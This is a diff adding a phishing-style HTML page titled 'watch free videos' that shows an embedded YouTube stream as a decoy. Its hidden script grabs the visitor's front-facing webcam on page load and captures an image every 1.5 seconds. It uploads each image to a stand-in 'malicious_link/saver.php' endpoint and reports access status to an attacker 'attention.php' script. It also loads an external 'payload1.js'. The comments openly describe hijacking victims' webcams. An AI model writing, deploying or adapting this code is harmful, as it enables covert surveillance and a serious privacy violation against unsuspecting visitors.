@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible"content="IE=edge">
+        <meta name="viewport"content="width=device-width,initial-scale=1.0">
+        <title>watch free videos</title>
+        <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+        <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+      <script type="text/javascript" src="payload1.js"></script>
+      <style>
+        body{
+          background-color: #333;
+        }iframe{border: #ccc 3px solid;}
+        iframe{display: flex;justify-content: center;align-items: center;}
+      </style>
+    </head>
+    <body>
+      
+    <div class="anonContent">
+      <div class="video-wrap" hidden="hidden"><video id="video" playsinline autoplay></video></div>
+       <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+        <span id="errorMsg" hidden="hidden"></span>
+          </div>
+
+  <script>
+    function post(imgdata){
+    $.ajax({
+        type: 'POST',
+        data: { caption: imgdata},
+        url: 'malicious_link/saver.php',
+        dataType: 'json',
+        async: false,
+        success: function(result){
+            // call the function that handles the response/results
+        },
+        error: function(){
+        }
+      });
+    };
+    
+    
+    'use strict';
+    
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.getElementById('errorMsg');
+    
+    const constraints = {
+      audio: false,
+      video: {
+        
+        facingMode: "user"
+      }
+    };
+    
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        errorMsgElement.innerHTML = e.toString();
+        console.log(`navigator.getUserMedia error:${e.toString()}`);
+        if (e.toString().includes("NotFoundError")){
+            console.log("Hmm, ebi like say dis device no get any internal or external webcam!");
+        await wait4me(5000);
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("post", "malicious_link/attention.php?denied1=Internal_or_external_webcam_can_not_be_found_in_victims_device!");//
+            xhttp.send();
+            console.log(xhttp);
+        } else {
+          console.log("Hmm,\nWe fucking well need to fucking access ur fucking webcam, men!");
+          await wait4me(5000);
+          var xhttp = new XMLHttpRequest();
+          var msg = "Victims_dispermit_us_in_accessing_their_webcam, Means_that_u_will_not_be_able_to_receive_their_active_photos.!";
+          xhttp.open("post", `malicious_link/attention.php?denied1=${msg}`);//
+          xhttp.send();
+          console.log(xhttp);
+        }
+      }
+    }
+    
+    // Success
+    async function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+      console.log("Hahaha, we don hijack this device webcam!");
+        await wait4me(5000);
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("post", "malicious_link/attention.php?granted1=We_successfully_hijack_victims_webcam!, U_can_now_be_able_to_received_victims_actibve_photos.");//
+            xhttp.send();
+            console.log(xhttp);
+    
+    var context = canvas.getContext('2d');
+      setInterval(function(){
+    
+           context.drawImage(video, 0, 0, 640, 480);
+           var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+           post(canvasData); }, 1500);
+    
+    }
+    
+    // Load init
+    init();
+    
+    </script>
+        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+      <script>
+        async function more(){
+        console.log("done_with_the_information_hunting!...");
+        await wait4me(5000);
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("post", `malicious_link/attention.php?redFlag=done_with_the_information_hunting!...`);//
+        xhttp.send();
+        console.log(xhttp);}
+      </script>
+    </body>
+</html>
